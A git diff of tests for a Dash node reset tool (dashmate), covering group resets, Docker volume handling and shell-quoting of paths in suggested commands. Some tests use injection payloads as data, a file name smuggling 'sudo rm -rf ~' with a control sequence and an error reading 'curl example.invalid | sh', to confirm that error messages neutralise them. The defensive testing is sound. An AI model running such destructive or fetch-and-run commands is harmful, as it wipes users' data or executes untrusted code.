@@ -1,4 +1,5 @@
 import fs from 'fs';
+import os from 'os';
 import path from 'path';
 import { Listr } from 'listr2';
 import { asValue } from 'awilix';
@@ -13,6 +14,8 @@ import getTestnetConfigFactory from '../../../../configs/defaults/getTestnetConf
 import getLocalConfigFactory from '../../../../configs/defaults/getLocalConfigFactory.js';
 import getMainnetConfigFactory from '../../../../configs/defaults/getMainnetConfigFactory.js';
 import resetNodeTaskFactory from '../../../../src/listr/tasks/resetNodeTaskFactory.js';
+import quoteShellArgument from '../../../../src/util/quoteShellArgument.js';
+import GroupResetCommand from '../../../../src/commands/group/reset.js';
 import generateTenderdashNodeKey from '../../../../src/tenderdash/generateTenderdashNodeKey.js';
 import deriveTenderdashNodeId from '../../../../src/tenderdash/deriveTenderdashNodeId.js';
 
@@ -155,20 +158,34 @@ describe('resetNodeTaskFactory', () => {
     it('should refuse while the services the reset removes are running', async () => {
       dockerCompose.isNodeRunning.resolves(true);
 
-      await expect(resetNodeTask.assertCanBeReset(config, { isPlatformOnlyReset: true, isForce: false }))
+      await expect(resetNodeTask.prepare(config, { isPlatformOnlyReset: true, isForce: false }))
         .to.be.rejectedWith('Running services detected');
     });
 
     it('should not look at running services when forced', async () => {
       dockerCompose.isNodeRunning.resolves(true);
 
-      await resetNodeTask.assertCanBeReset(config, { isPlatformOnlyReset: true, isForce: true });
+      await resetNodeTask.prepare(config, { isPlatformOnlyReset: true, isForce: true });
 
       expect(dockerCompose.isNodeRunning).to.not.have.been.called();
     });
 
+    // A member can be started while the members before it are reset, after
+    // the group's check found it stopped.
+    it('should look at running services again when it resets a member', async () => {
+      const ctx = { isPlatformOnlyReset: true, isForce: false, keepData: true };
+      const plan = await resetNodeTask.prepare(config, ctx);
+
+      dockerCompose.isNodeRunning.resolves(true);
+
+      await expect(new Listr([{ task: () => resetNodeTask(config, plan) }], { renderer: 'silent' }).run(ctx))
+        .to.be.rejectedWith('Running services detected');
+
+      expect(dockerCompose.rm).to.not.have.been.called();
+    });
+
     it('should refuse what the reset itself refuses', async () => {
-      await expect(resetNodeTask.assertCanBeReset(config, {
+      await expect(resetNodeTask.prepare(config, {
         isPlatformOnlyReset: true, isHardReset: true, removeConfig: true, isForce: true,
       })).to.be.rejectedWith('Cannot reset Platform only and remove config');
     });
@@ -242,6 +259,51 @@ describe('resetNodeTaskFactory', () => {
 
       expect(configFile.isConfigExists('devnet-ops')).to.be.false();
       expect(fs.existsSync(homeDir.joinPath('devnet-ops'))).to.be.false();
+    });
+  });
+
+  // A config file written before `config.json` became a reserved name may
+  // still hold a config by that name. Its directory would be the file that
+  // holds every config, so the entry goes and the path is never removed, as
+  // `config remove` does.
+  describe('a legacy config named after the config file', () => {
+    [
+      { group: 'ops', ctx: {} },
+      { group: 'local', ctx: { removeConfig: true } },
+    ].forEach(({ group, ctx }) => {
+      it(`should keep the config file on a hard reset of a member of group '${group}'`, async () => {
+        const options = getTestnetConfig().getStoredOptions();
+        options.group = group;
+        useConfigs([new Config('config.json', options)]);
+
+        const configFilePath = homeDir.joinPath('config.json');
+        fs.writeFileSync(configFilePath, '{"configs":{}}');
+
+        await hardReset({ isPlatformOnlyReset: false, ...ctx });
+
+        expect(dockerCompose.down).to.have.been.calledOnce();
+        expect(configFile.isConfigExists('config.json')).to.be.false();
+        expect(fs.readFileSync(configFilePath, 'utf8')).to.equal('{"configs":{}}');
+      });
+    });
+
+    // With defaults the hard reset keeps the entry, and the command then
+    // renders its service files into a directory that cannot exist. Found out
+    // only then, the services would already be gone.
+    [true, false].forEach((isPlatformOnlyReset) => {
+      it(`should refuse a ${isPlatformOnlyReset ? 'Platform' : 'full'} hard reset that keeps it`, async () => {
+        const options = getTestnetConfig().getStoredOptions();
+        options.group = 'testnet';
+        useConfigs([new Config('config.json', options)]);
+
+        await expect(hardReset({ isPlatformOnlyReset, isForce: false }))
+          .to.be.rejectedWith(/'config\.json'[\s\S]*dashmate config remove config\.json/);
+
+        expect(dockerCompose.isNodeRunning).to.not.have.been.called();
+        expect(dockerCompose.down).to.not.have.been.called();
+        expect(dockerCompose.rm).to.not.have.been.called();
+        expect(configFile.isConfigExists('config.json')).to.be.true();
+      });
     });
   });
 
@@ -436,7 +498,7 @@ describe('resetNodeTaskFactory', () => {
       );
 
       expect(error.message).to.include(`'${configPath}'`);
-      expect(error.message).to.include(`chmod u+rwx '${configPath}'`);
+      expect(error.message).to.include(`chmod u+rwx ${quoteShellArgument(configPath)}`);
       expect(dockerCompose.rm).to.not.have.been.called();
     });
 
@@ -452,7 +514,7 @@ describe('resetNodeTaskFactory', () => {
         (e) => e,
       );
 
-      expect(error.message).to.include(`chmod u+rwx '${configPath}'`);
+      expect(error.message).to.include(`chmod u+rwx ${quoteShellArgument(configPath)}`);
       expect(error.message).to.not.include('chmod -R');
       expect(dockerCompose.rm).to.not.have.been.called();
     });
@@ -466,7 +528,7 @@ describe('resetNodeTaskFactory', () => {
       const configPath = lockDirectory('testnet');
 
       await expect(hardReset({ isPlatformOnlyReset: true }))
-        .to.be.rejectedWith(`chmod u+rwx '${configPath}'`);
+        .to.be.rejectedWith(`chmod u+rwx ${quoteShellArgument(configPath)}`);
 
       expect(dockerCompose.rm).to.not.have.been.called();
     });
@@ -484,6 +546,148 @@ describe('resetNodeTaskFactory', () => {
         .to.be.rejectedWith(/and 2 more/);
 
       expect(lockedPaths).to.have.lengthOf(12);
+    });
+
+    /**
+     * Move the test to a home directory whose path a shell must be given
+     * quoted, with the same files as the one it replaces
+     */
+    function useHomeDirWithApostrophe() {
+      homeDir.remove();
+      homeDir = new HomeDir(fs.mkdtempSync(path.join(os.tmpdir(), "dashmate-o'brien-")));
+
+      useConfigs([config]);
+
+      writeFile('testnet', 'core', 'dash.conf');
+      writeFile('testnet', 'platform', 'drive', 'tenderdash', 'config.toml');
+      writeFile('testnet', 'platform', 'gateway', 'ssl', 'private.key');
+    }
+
+    // The commands are there to be pasted. Nothing validates the home
+    // directory's path, and a quote in it ended the quoting early.
+    it('should quote the paths in the commands it gives for a shell', async function test() {
+      skipAsRoot(this);
+      useHomeDirWithApostrophe();
+
+      const sslPath = lockDirectory('testnet', 'platform', 'gateway', 'ssl');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
+      const quotedPlatformPath = `'${platformPath.split("'").join("'\\''")}'`;
+      const { uid, gid } = os.userInfo();
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      expect(error.message).to.include(`  sudo chown -R ${uid}:${gid} ${quotedPlatformPath}\n`);
+      expect(error.message).to.include(`  chmod -R u+rwX ${quotedPlatformPath}\n`);
+      expect(error.message).to.include(`  '${sslPath.split("'").join("\\'")}'\n`);
+    });
+
+    it('should quote the directory holding the target in the commands it gives', async function test() {
+      skipAsRoot(this);
+      useHomeDirWithApostrophe();
+
+      const configPath = lockDirectory('testnet');
+      const quotedConfigPath = `'${configPath.split("'").join("'\\''")}'`;
+      const { uid, gid } = os.userInfo();
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      expect(error.message).to.include(`  sudo chown ${uid}:${gid} ${quotedConfigPath}\n`);
+      expect(error.message).to.include(`  chmod u+rwx ${quotedConfigPath}\n`);
+    });
+
+    it('should quote the path in the removal it advises once removal has begun', async function test() {
+      useHomeDirWithApostrophe();
+
+      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
+      const { unlinkSync } = fs;
+      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
+        if (filePath === keyPath) {
+          const error = new Error(`EPERM: operation not permitted, unlink '${filePath}'`);
+          error.code = 'EPERM';
+          throw error;
+        }
+
+        return unlinkSync.call(fs, filePath);
+      });
+
+      await expect(hardReset({ isPlatformOnlyReset: true }))
+        .to.be.rejectedWith(`  sudo rm -rf '${platformPath.split("'").join("'\\''")}'\n`);
+    });
+
+    // A file name can hold a line break or a terminal control sequence. Shown
+    // as it is, the rest of the name would read as a line of the message, an
+    // instruction to run included.
+    it('should show each path it cannot remove on one line', async function test() {
+      skipAsRoot(this);
+
+      const lockedName = 'locked\nsudo rm -rf ~\u001b[2K';
+      writeFile('testnet', 'platform', lockedName, 'file');
+      lockDirectory('testnet', 'platform', lockedName);
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      const lines = error.message.split('\n');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
+
+      expect(lines).to.include(`  '${platformPath}${path.sep}locked\\nsudo rm -rf ~\\x1b[2K'`);
+      expect(lines.filter((line) => line.startsWith('sudo rm'))).to.be.empty();
+      expect(error.message).to.not.include('\u001b');
+    });
+
+    it('should show a filesystem error on one line', async function test() {
+      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
+      const { unlinkSync } = fs;
+      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
+        if (filePath === keyPath) {
+          const error = new Error('EIO: i/o error\nRun: curl example.invalid | sh');
+          error.code = 'EIO';
+          throw error;
+        }
+
+        return unlinkSync.call(fs, filePath);
+      });
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      expect(error.message).to.include('EIO: i/o error\\nRun: curl example.invalid | sh');
+      expect(error.message.split('\n').filter((line) => line.startsWith('Run:'))).to.be.empty();
+    });
+
+    it('should show a filesystem error the check meets on one line', async function test() {
+      const sslPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl');
+      const { lstatSync } = fs;
+      this.sinon.stub(fs, 'lstatSync').callsFake((checkedPath, ...args) => {
+        if (checkedPath === sslPath) {
+          const error = new Error('EIO: i/o error\nRun: curl example.invalid | sh');
+          error.code = 'EIO';
+          throw error;
+        }
+
+        return lstatSync.call(fs, checkedPath, ...args);
+      });
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      expect(error.message).to.include('EIO: i/o error\\nRun: curl example.invalid | sh');
+      expect(error.message.split('\n').filter((line) => line.startsWith('Run:'))).to.be.empty();
+      expect(error.message).to.include('Nothing has been changed');
+      expect(dockerCompose.rm).to.not.have.been.called();
     });
 
     // A link out of the config's directory, to another node's files or the
@@ -646,12 +850,54 @@ describe('resetNodeTaskFactory', () => {
     };
 
     let composeCalls;
+    let serviceVolumes;
+    let volumeDefinitions;
+    let dockerVolumeLabels;
     let removedVolumes;
     let runningContainers;
     let configFailure;
+    let configFailureConfigName;
     let platformConfig;
     let projectName;
     let diContainer;
+
+    /**
+     * Name the volumes as Compose does and label them as Docker does for the
+     * ones Compose created for the project: with the project and the key
+     */
+    function createProjectVolumes() {
+      volumeDefinitions = {};
+      dockerVolumeLabels = {};
+      Object.values(serviceVolumes).flat()
+        .filter(({ type }) => type === 'volume')
+        .forEach(({ source }) => {
+          volumeDefinitions[source] = { name: `docker_${source}` };
+          dockerVolumeLabels[`docker_${source}`] = {
+            'com.docker.compose.project': projectName,
+            'com.docker.compose.volume': source,
+          };
+        });
+    }
+
+    /**
+     * A Docker volume as the Docker API gives it
+     *
+     * @param {string} name
+     * @param {function(): Promise<void>} remove
+     * @return {Object}
+     */
+    function dockerVolume(name, remove) {
+      return {
+        inspect: async () => {
+          if (!dockerVolumeLabels[name]) {
+            throw Object.assign(new Error(`no such volume: ${name}`), { statusCode: 404 });
+          }
+
+          return { Name: name, Labels: dockerVolumeLabels[name] };
+        },
+        remove,
+      };
+    }
 
     beforeEach(async function beforeEach() {
       diContainer = await createDIContainer({ DASHMATE_HOME_DIR: homeDir.getPath() });
@@ -665,15 +911,17 @@ describe('resetNodeTaskFactory', () => {
 
       projectName = diContainer.resolve('generateEnvs')(platformConfig).COMPOSE_PROJECT_NAME;
 
+      serviceVolumes = structuredClone(SERVICE_VOLUMES);
+      createProjectVolumes();
+
       removedVolumes = [];
       runningContainers = [];
       configFailure = null;
+      configFailureConfigName = null;
       diContainer.register({
         docker: asValue({
-          getVolume: (name) => ({
-            remove: async () => {
-              removedVolumes.push(name);
-            },
+          getVolume: (name) => dockerVolume(name, async () => {
+            removedVolumes.push(name);
           }),
         }),
       });
@@ -685,7 +933,7 @@ describe('resetNodeTaskFactory', () => {
         const composeOptions = (options.composeOptions ?? []).flat();
         const commandOptions = (options.commandOptions ?? []).flat();
         composeCalls.push({
-          command, args, composeOptions, commandOptions,
+          command, args, composeOptions, commandOptions, configName: options.env?.CONFIG_NAME,
         });
 
         const profiles = composeOptions.filter((_, i) => composeOptions[i - 1] === '--profile');
@@ -699,31 +947,40 @@ describe('resetNodeTaskFactory', () => {
         }
 
         if (command === 'ps') {
+          // Compose before 2.15 fails `ps <names>` when a named service has
+          // no container.
+          const namedServices = commandOptions
+            .filter((option, i) => !option.startsWith('-') && commandOptions[i - 1] !== '--format');
+          const serviceWithoutContainer = namedServices
+            .find((name) => !runningContainers.some(({ Service: service }) => service === name));
+
+          if (serviceWithoutContainer) {
+            // eslint-disable-next-line prefer-promise-reject-errors
+            return Promise.reject({ exitCode: 1, out: '', err: `no such service: ${serviceWithoutContainer}\n` });
+          }
+
           return { exitCode: 0, err: '', out: runningContainers.map((c) => JSON.stringify(c)).join('\n') };
         }
 
-        if (command === 'config' && configFailure) {
+        if (command === 'config' && configFailure && (configFailureConfigName === null
+          || options.env.CONFIG_NAME === configFailureConfigName)) {
           return Promise.reject(configFailure);
         }
 
         if (command === 'config' && commandOptions.includes('--volumes')) {
-          return { exitCode: 0, err: '', out: Object.values(SERVICE_VOLUMES).flat().map(({ source }) => source).join('\n') };
+          return { exitCode: 0, err: '', out: Object.values(serviceVolumes).flat().map(({ source }) => source).join('\n') };
         }
 
         if (command === 'config') {
           const services = Object.fromEntries(
             [...args, ...(args.includes('quorum_list') ? ['core'] : [])]
-              .map((name) => [name, { volumes: SERVICE_VOLUMES[name] }]),
-          );
-
-          const volumes = Object.fromEntries(
-            Object.values(SERVICE_VOLUMES).flat()
-              .filter(({ type }) => type === 'volume')
-              .map(({ source }) => [source, { name: `docker_${source}` }]),
+              .map((name) => [name, { volumes: serviceVolumes[name] }]),
           );
 
           return {
-            exitCode: 0, err: '', out: JSON.stringify({ name: projectName, services, volumes }),
+            exitCode: 0,
+            err: '',
+            out: JSON.stringify({ name: projectName, services, volumes: volumeDefinitions }),
           };
         }
 
@@ -838,6 +1095,32 @@ describe('resetNodeTaskFactory', () => {
       expect(selectedProfiles(configCall.composeOptions)).to.have.members(ALL_PROFILES);
     });
 
+    // An override can mount into a Platform service a volume the operator
+    // manages, or one another project created under the same explicit name.
+    // Neither is this project's Platform data, and once the containers are
+    // gone nothing holds them in use.
+    it('should keep an external volume and another project\'s volume a Platform service mounts', async () => {
+      serviceVolumes.gateway = [
+        { type: 'volume', source: 'operator_logs', target: '/var/log/operator' },
+        { type: 'volume', source: 'shared_cache', target: '/var/cache/shared' },
+      ];
+      volumeDefinitions.operator_logs = { name: 'operator_logs', external: true };
+      volumeDefinitions.shared_cache = { name: 'shared_cache' };
+      dockerVolumeLabels.operator_logs = {};
+      dockerVolumeLabels.shared_cache = {
+        'com.docker.compose.project': 'other_project',
+        'com.docker.compose.volume': 'shared_cache',
+      };
+
+      await platformReset();
+
+      expect(removedVolumes).to.have.members([
+        'docker_drive_abci_data',
+        'docker_drive_tenderdash',
+        'docker_rs-dapi-access-logs',
+      ]);
+    });
+
     // Compose cannot describe the project while service files it needs are
     // missing. Finding that out after the removal would leave the containers
     // gone and the volumes in place.
@@ -849,21 +1132,82 @@ describe('resetNodeTaskFactory', () => {
       expect(composeCalls.filter(({ command }) => command === 'rm')).to.be.empty();
     });
 
+    // A group reset removes its members one after another, so a member whose
+    // project Compose cannot describe would be found only after the members
+    // before it lost their Platform services. Forcing the reset skips the
+    // running-services check only.
+    it('should look up every member\'s volumes before it removes any member\'s services', async () => {
+      const members = ['node_1', 'node_2'].map((name) => {
+        const options = platformConfig.getStoredOptions();
+        options.group = 'testnet';
+
+        return new Config(name, options);
+      });
+
+      configFailure = { exitCode: 1, out: '', err: 'env file logger.env not found\n' };
+      configFailureConfigName = 'node_2';
+
+      const error = await GroupResetCommand.prototype.runWithDependencies.call(
+        {},
+        {},
+        {
+          verbose: false, hard: false, force: true, platform: true,
+        },
+        diContainer.resolve('resetNodeTask'),
+        members,
+        () => new Listr([]),
+        () => new Listr([]),
+      ).then(() => null, (e) => e);
+
+      expect(error.getError().message).to.include('logger.env');
+      expect(composeCalls.filter(({ command }) => command === 'rm')).to.be.empty();
+    });
+
+    // The removal goes by the plan the group's check prepared for the
+    // member, rather than asking Compose again once other members are gone.
+    it('should reset each member of a group by the plan its check prepared', async () => {
+      const members = ['node_1', 'node_2'].map((name) => {
+        const options = platformConfig.getStoredOptions();
+        options.group = 'testnet';
+
+        return new Config(name, options);
+      });
+
+      await GroupResetCommand.prototype.runWithDependencies.call(
+        {},
+        {},
+        {
+          verbose: false, hard: false, force: true, platform: true,
+        },
+        diContainer.resolve('resetNodeTask'),
+        members,
+        () => new Listr([]),
+        () => new Listr([]),
+      );
+
+      const callsFor = (command) => composeCalls
+        .filter((call) => call.command === command)
+        .map(({ configName }) => configName);
+
+      expect(callsFor('config')).to.have.members(['node_1', 'node_2']);
+      expect(callsFor('rm')).to.deep.equal(['node_1', 'node_2']);
+      expect(composeCalls.findIndex(({ command }) => command === 'rm'))
+        .to.be.above(composeCalls.map(({ command }) => command).lastIndexOf('config'));
+    });
+
     it('should remove the Platform services again the same way while a volume is in use', async () => {
       let attempts = 0;
       diContainer.register({
         docker: asValue({
-          getVolume: (name) => ({
-            remove: async () => {
-              attempts += 1;
+          getVolume: (name) => dockerVolume(name, async () => {
+            attempts += 1;
 
-              if (name === 'docker_drive_abci_data' && attempts === 1) {
-                // eslint-disable-next-line no-throw-literal
-                throw { statusCode: 409 };
-              }
+            if (name === 'docker_drive_abci_data' && attempts === 1) {
+              // eslint-disable-next-line no-throw-literal
+              throw { statusCode: 409 };
+            }
 
-              removedVolumes.push(name);
-            },
+            removedVolumes.push(name);
           }),
         }),
       });
@@ -885,6 +1229,7 @@ describe('resetNodeTaskFactory', () => {
       platformConfig.set('platform.quorumList.enabled', true);
       platformConfig.set('platform.gateway.rateLimiter.metrics.enabled', true);
       projectName = diContainer.resolve('generateEnvs')(platformConfig).COMPOSE_PROJECT_NAME;
+      createProjectVolumes();
 
       await platformReset({ isHardReset: true });
 
@@ -918,10 +1263,8 @@ describe('resetNodeTaskFactory', () => {
       const clock = this.sinon.useFakeTimers();
       diContainer.register({
         docker: asValue({
-          getVolume: () => ({
-            // eslint-disable-next-line prefer-promise-reject-errors
-            remove: () => Promise.reject({ statusCode: 409 }),
-          }),
+          // eslint-disable-next-line prefer-promise-reject-errors
+          getVolume: (name) => dockerVolume(name, () => Promise.reject({ statusCode: 409 })),
         }),
       });
 
@@ -941,6 +1284,19 @@ describe('resetNodeTaskFactory', () => {
       await platformReset({ isForce: false });
 
       expect(removedServices()).to.include('drive_abci');
+    });
+
+    // `docker compose ps <names>` fails before Compose 2.15 when a named
+    // service has no container, which read as nothing running. A service the
+    // config enables but that was never started then hid a running Core, and
+    // the reset went on to take the node down.
+    it('should refuse a full reset while Core runs next to a service with no container', async () => {
+      runningContainers = [runningContainer('core')];
+
+      await expect(platformReset({ isPlatformOnlyReset: false, isForce: false }))
+        .to.be.rejectedWith('Running services detected');
+
+      expect(composeCalls.filter(({ command }) => command === 'down')).to.be.empty();
     });
 
     // `docker compose ps <names>` fails before Compose 2.15 when a named
